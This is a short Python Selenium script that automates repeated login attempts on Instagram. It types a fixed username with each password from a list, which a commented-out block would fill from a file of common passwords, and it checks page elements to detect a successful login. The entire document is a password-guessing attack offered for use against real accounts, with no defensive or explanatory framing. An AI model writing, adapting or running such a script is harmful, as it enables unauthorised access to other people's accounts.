"""
This code is written by
AMAN KAZI
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time

browser = webdriver.Chrome('chromedriver.exe')
browser.get("https://www.instagram.com/")
time.sleep(5)
link_tags_before_login=browser.find_elements_by_tag_name('link')

#Use password.txt file which includes some common passwords.
# with open("password.txt") as passfile:
# 	passlist=passfile.readlines()
# 	for x in range(len(passlist)):
# 		if("\n" in passlist[x]):
# 			passlist[x]=passlist[x].strip("\n")
# 		else:
# 			pass

passlist=['1234','allpasswordsgoes here']			

try:
	for y in passlist:
		username = browser.find_element_by_tag_name('input')
		# username.clear()
		password = browser.find_element_by_name('password')
		login    = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')
		username.send_keys("WriteUsernameHere")
		password.send_keys(y)
		login.click()
		time.sleep(5)
		link_tags_after_login=browser.find_elements_by_tag_name('link')
		if(len(link_tags_before_login)==len(link_tags_after_login)):
			browser.refresh()
			time.sleep(2)
			continue
		else:
			print('You are logged in')
			break
except Exception as e:
	print('Something went wrong, exception found is ',e)
